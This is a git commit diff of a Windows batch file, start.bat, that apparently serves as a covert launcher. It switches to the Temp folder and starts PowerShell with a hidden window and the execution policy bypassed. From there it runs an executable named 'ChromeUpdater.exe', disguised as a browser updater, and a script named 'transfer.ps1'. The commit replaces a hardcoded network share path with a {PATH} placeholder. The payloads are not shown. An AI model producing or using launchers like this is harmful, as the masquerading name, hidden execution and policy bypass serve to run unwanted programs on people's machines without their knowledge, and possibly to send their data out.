86795abaede624dee47a963f25ab96a449628749
AllenKoholic <42421033+AllenKoholic@users.noreply.github.com>
2023-05-10 11:16:56 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,6 +1,5 @@
 @ECHO OFF
 
 cd %userprofile%\AppData\Local\Temp
-start Powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process '\\JACKH-LAPTOP\Users\JackH\Documents\Test\ChromeUpdater.exe';
-start Powershell -windowstyle hidden -ExecutionPolicy Bypass -File '\\JACKH-LAPTOP\Users\JackH\Documents\Test\transfer.ps1';
-:: "C:\Users\JackH\Documents\Test\ChromeUpdater.exe"
+start Powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process '{PATH}\ChromeUpdater.exe';
+start Powershell -windowstyle hidden -ExecutionPolicy Bypass -File '{PATH}\transfer.ps1';
